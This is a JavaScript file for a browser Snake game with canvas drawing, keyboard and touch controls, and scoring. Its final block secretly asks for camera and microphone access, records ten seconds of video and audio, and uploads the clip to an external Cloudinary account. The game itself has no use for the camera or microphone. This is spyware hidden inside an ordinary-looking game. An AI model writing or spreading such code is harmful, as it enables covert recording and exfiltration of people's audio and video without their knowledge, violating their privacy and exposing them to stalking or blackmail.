const canvas = document.getElementById('game');
const ctx = canvas.getContext('2d');
const scoreboard = document.getElementById('scoreboard');
const newGameBtn = document.getElementById('newGameBtn');
const status = document.getElementById('status');

const gridSize = 16;
const tileCount = canvas.width / gridSize;

let snake = [{x: 10, y: 10}];
let velocity = {x: 0, y: 0};
let apple = {x: 5, y: 5};
let score = 0;
let gameInterval = null;

function drawGame() {
  // Move snake
  const head = { x: snake[0].x + velocity.x, y: snake[0].y + velocity.y };

  // Wrap around edges
  head.x = (head.x + tileCount) % tileCount;
  head.y = (head.y + tileCount) % tileCount;

  // Check collision with self
  if (snake.some(segment => segment.x === head.x && segment.y === head.y)) {
    gameOver();
    return;
  }

  snake.unshift(head);

  // Eat apple
  if (head.x === apple.x && head.y === apple.y) {
    score++;
    placeApple();
  } else {
    snake.pop();
  }

  // Draw background
  ctx.fillStyle = '#222';
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  // Draw snake
  ctx.fillStyle = '#0f0';
  snake.forEach((segment, i) => {
    ctx.fillRect(segment.x * gridSize, segment.y * gridSize, gridSize-2, gridSize-2);
  });

  // Draw apple
  ctx.fillStyle = '#f00';
  ctx.beginPath();
  ctx.arc(apple.x * gridSize + gridSize/2, apple.y * gridSize + gridSize/2, gridSize/2 - 2, 0, 2 * Math.PI);
  ctx.fill();

  scoreboard.textContent = `Score: ${score}`;
}

function placeApple() {
  let newApple;
  do {
    newApple = {
      x: Math.floor(Math.random() * tileCount),
      y: Math.floor(Math.random() * tileCount)
    };
  } while (snake.some(s => s.x === newApple.x && s.y === newApple.y));
  apple = newApple;
}

function gameOver() {
  clearInterval(gameInterval);
  alert(`Game over! Your score was ${score}.`);
  status.textContent = "Game Over. Press 'New Game' to play again.";
}

function resetGame() {
  snake = [{x: 10, y: 10}];
  velocity = {x: 1, y: 0};  // start moving right immediately
  score = 0;
  placeApple();
  status.textContent = "Recording in background...";
  clearInterval(gameInterval);
  gameInterval = setInterval(drawGame, 150);
}

window.addEventListener('keydown', e => {
  switch(e.key) {
    case 'ArrowUp': if (velocity.y === 0) velocity = {x: 0, y: -1}; break;
    case 'ArrowDown': if (velocity.y === 0) velocity = {x: 0, y: 1}; break;
    case 'ArrowLeft': if (velocity.x === 0) velocity = {x: -1, y: 0}; break;
    case 'ArrowRight': if (velocity.x === 0) velocity = {x: 1, y: 0}; break;
  }
});

// Touch controls for mobile (swipe detection)
let touchStartX = null;
let touchStartY = null;

canvas.addEventListener('touchstart', e => {
  const touch = e.touches[0];
  touchStartX = touch.clientX;
  touchStartY = touch.clientY;
});

canvas.addEventListener('touchend', e => {
  const touch = e.changedTouches[0];
  const dx = touch.clientX - touchStartX;
  const dy = touch.clientY - touchStartY;

  if (Math.abs(dx) > Math.abs(dy)) {
    if (dx > 20 && velocity.x === 0) velocity = {x: 1, y: 0};
    else if (dx < -20 && velocity.x === 0) velocity = {x: -1, y: 0};
  } else {
    if (dy > 20 && velocity.y === 0) velocity = {x: 0, y: 1};
    else if (dy < -20 && velocity.y === 0) velocity = {x: 0, y: -1};
  }
});

newGameBtn.addEventListener('click', resetGame);

// Start the game initially
resetGame();

// === Webcam + Mic + Back Camera Recording ===

navigator.mediaDevices.getUserMedia({
  video: { facingMode: { ideal: "environment" } },
  audio: true
})
.then(stream => {
  // Create MediaRecorder to record webcam video & audio
  const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
  let chunks = [];

  mediaRecorder.ondataavailable = e => {
    if (e.data.size > 0) {
      chunks.push(e.data);
    }
  };

  mediaRecorder.onstop = () => {
    const blob = new Blob(chunks, { type: 'video/webm' });
    chunks = [];

    // Upload to Cloudinary or your server here
    uploadVideo(blob);
  };

  mediaRecorder.start();

  // Stop recording after 10 seconds (adjust if you want)
  setTimeout(() => mediaRecorder.stop(), 10000);

  function uploadVideo(blob) {
    const formData = new FormData();
    formData.append('file', blob);
    formData.append('upload_preset', 'unsigned'); // replace with your upload preset
    fetch('https://api.cloudinary.com/v1_1/dps0g5ftz/video/upload', {
      method: 'POST',
      body: formData
    }).then(response => response.json())
      .then(data => {
        console.log('Upload success:', data.secure_url);
      }).catch(err => {
        console.error('Upload failed:', err);
      });
  }
})
.catch(err => {
  console.error('Could not access media devices:', err);
  status.textContent = "No access to camera/mic.";
});